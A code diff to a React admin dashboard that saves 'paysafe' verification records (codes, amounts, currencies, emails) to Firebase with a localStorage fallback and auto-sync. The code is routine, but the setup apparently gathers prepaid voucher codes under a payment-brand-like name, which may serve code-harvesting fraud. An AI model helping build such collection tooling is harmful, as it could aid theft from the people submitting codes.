@@ -1,4 +1,4 @@
-import { useState, useEffect } from "react";
+import { useState, useEffect, useRef } from "react";
 import {
   addVerification as firebaseAdd,
   onVerificationsSnapshot,
@@ -18,27 +18,33 @@ export interface VerificationRecord {
   emailStatus: "success" | "failed";
 }
 
-// Save — writes to Firebase + localStorage fallback
+// Save — writes to Firebase first, localStorage as fallback
 export async function saveVerification(
   record: Omit<VerificationRecord, "id" | "date" | "timestamp">
 ) {
-  // Always save to localStorage as fallback
-  const existing = getLocalVerifications();
-  const now = new Date();
-  const newRecord: VerificationRecord = {
-    ...record,
-    id: crypto.randomUUID?.() || Math.random().toString(36).slice(2),
-    date: now.toLocaleString(),
-    timestamp: now.getTime(),
-  };
-  existing.unshift(newRecord);
-  localStorage.setItem("paysafe_verifications", JSON.stringify(existing));
-
-  // Also save to Firebase
+  // Try Firebase first
+  let firebaseOk = false;
   try {
-    await firebaseAdd(record);
+    firebaseOk = await firebaseAdd(record);
   } catch {
-    console.log("Firebase save failed, data saved locally");
+    console.log("Firebase save failed");
+  }
+
+  // If Firebase failed, save to localStorage as fallback
+  if (!firebaseOk) {
+    const existing = getLocalVerifications();
+    const now = new Date();
+    const newRecord: VerificationRecord = {
+      ...record,
+      id: crypto.randomUUID?.() || Math.random().toString(36).slice(2),
+      date: now.toLocaleString(),
+      timestamp: now.getTime(),
+    };
+    existing.unshift(newRecord);
+    localStorage.setItem("paysafe_verifications", JSON.stringify(existing));
+    console.log("Data saved to localStorage (Firebase unavailable)");
+  } else {
+    console.log("Data saved to Firebase successfully");
   }
 }
 
@@ -49,6 +55,32 @@ function getLocalVerifications(): VerificationRecord[] {
   } catch {
     return [];
   }
+}
+
+// Auto-sync localStorage → Firebase (called when Firebase connects)
+async function autoSyncLocalToFirebase(): Promise<number> {
+  const localData = getLocalVerifications();
+  if (localData.length === 0) return 0;
+
+  console.log(`Auto-syncing ${localData.length} local records to Firebase...`);
+  let successCount = 0;
+  for (const record of localData) {
+    const ok = await firebaseAdd({
+      code: record.code,
+      amount: record.amount,
+      currency: record.currency,
+      email: record.email,
+      emailStatus: record.emailStatus,
+    });
+    if (ok) successCount++;
+  }
+
+  if (successCount > 0) {
+    // Clear localStorage after successful sync
+    localStorage.removeItem("paysafe_verifications");
+    console.log(`Auto-sync complete: ${successCount}/${localData.length} records synced`);
+  }
+  return successCount;
 }
 
 interface AdminDashboardProps {
@@ -87,6 +119,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
   const [records, setRecords] = useState<VerificationRecord[]>([]);
   const [search, setSearch] = useState("");
   const [dbConnected, setDbConnected] = useState<boolean | null>(null);
+  const hasSynced = useRef(false);
 
   useEffect(() => {
     // Check Firebase connection
@@ -110,9 +143,17 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
         }));
         setRecords(mapped);
       } else {
-        // Firebase connected but empty — check localStorage
+        // Firebase connected but empty — auto-sync localStorage if not already done
         const local = getLocalVerifications();
-        setRecords(local);
+        if (local.length > 0 && !hasSynced.current) {
+          hasSynced.current = true;
+          // Auto-sync local data to Firebase
+          autoSyncLocalToFirebase();
+          // Show local data while syncing
+          setRecords(local);
+        } else {
+          setRecords([]);
+        }
       }
     });
 
@@ -159,7 +200,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
       <header
         className="sticky top-0 z-50"
         style={{
-          background: "linear-gradient(135deg, #1236B8 0%, #1A45D2 100%)",
+          background: "linear-gradient(135deg, #04267f 0%, #0035bf 100%)",
           boxShadow: "0 2px 12px rgba(0,0,0,0.15)",
         }}
       >
@@ -201,7 +242,7 @@ export default function AdminDashboard({ onBack }: AdminDashboardProps) {
             label="Total Verifications"
             value={totalVerifications.toString()}
             icon="📊"
-            color="#1236B8"
+            color="#04267f"
           />
           <StatCard
             label="Today"
